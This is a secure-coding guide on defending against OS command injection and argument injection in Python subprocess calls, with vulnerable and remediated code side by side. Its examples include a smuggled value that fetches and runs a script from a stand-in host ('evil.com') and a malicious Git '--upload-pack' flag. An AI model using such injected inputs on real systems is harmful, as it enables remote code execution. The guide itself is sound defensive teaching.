Defeating OS Command Injection & Argument Tampering

OS Command Injection represents one of the highest-severity vulnerabilities in software engineering. Learn how shell metacharacters bypass string concatenations, why passing arguments as token lists avoids the shell interpreter entirely, and how to defend against argument injection traps.

What is OS Command Injection?

OS Command Injection (CWE-78) occurs when an application executes a system-level process using an interpreter shell (such as `/bin/sh`, `/bin/bash`, or `cmd.exe`) and incorporates untrusted, user-supplied data into the command string without adequate sanitization or structural separation.

Because shells interpret characters like ;, &&, ||, |, $(), and newlines as command delimiters, an attacker can append secondary arbitrary commands that execute with the privileges of the web application server process.

The Core Architectural Difference: Shell vs. Direct Exec

Understanding how the operating system executes binaries is the key to preventing command injection permanently:

Dangerous: Intermediate Shell

When functions like Python's subprocess.run(cmd, shell=True) or Node's child_process.exec(cmd) are called, the OS first spawns a shell process. The shell parses the entire string, searching for control tokens and piping operators before running the requested binary.

Safe: Direct Execve System Call

When arguments are provided as an array/list with shell=False or execFile(), the OS invokes the binary via the execve() system call directly. No shell is ever spawned, making shell command separators completely harmless.

Vulnerable Patterns vs. Remediated Code

Insecure: Shell Interpolation in Python 

# CRITICAL CWE-78: User input interpolated into shell command string
import subprocess

def create_archive(directory_name):
    # If directory_name is: "docs; curl http://evil.com/shell.sh | sh"
    # The shell runs both the tar command and the curl script!
    cmd = f"tar -czf archive.tar.gz {directory_name}"
    subprocess.run(cmd, shell=True)

Remediated: List-Based Direct Binary Invocations 

# SECURE: Explicit argument list passed with shell=False (default in subprocess.run)
import subprocess

def create_archive(directory_name):
    # Even if directory_name contains "; curl ...", tar treats the entire string 
    # as a literal directory path and exits with "No such file or directory"
    subprocess.run(["tar", "-czf", "archive.tar.gz", "--", directory_name], shell=False, check=True)

The Overlooked Threat: Argument Injection (CWE-88)

Even when developers use argument lists correctly, an attacker who controls an argument can pass program-specific flags (e.g. arguments beginning with - or --):

# If user_repo is: "--upload-pack=touch /tmp/pwned"
subprocess.run(["git", "clone", user_repo]) # Triggers arbitrary execution via Git flags!

# Mitigation 1: Enforce the POSIX "--" end-of-options delimiter
subprocess.run(["git", "clone", "--", user_repo])

# Mitigation 2: Strict input validation against allowlist
if not re.match(r"^https://github\.com/[a-zA-Z0-9_-]+/[a-zA-Z0-9_.-]+$", user_repo):
    raise ValueError("Invalid repository URL format")

Command Injection Defense Checklist

Ban shell=True: Never invoke subprocess.run(), Popen(), or exec() with shell expansion enabled.
Prefer Native APIs: Avoid shelling out to system commands when native language libraries exist (e.g. use Python's tarfile or shutil instead of calling external tar or rm).
Use Posix End-of-Options ("--"): Terminate command flag parsing before supplying user-controlled positional arguments.
Strict Regex Validation: Restrict allowable characters in file paths and usernames strictly to ^[a-zA-Z0-9._-]+$.
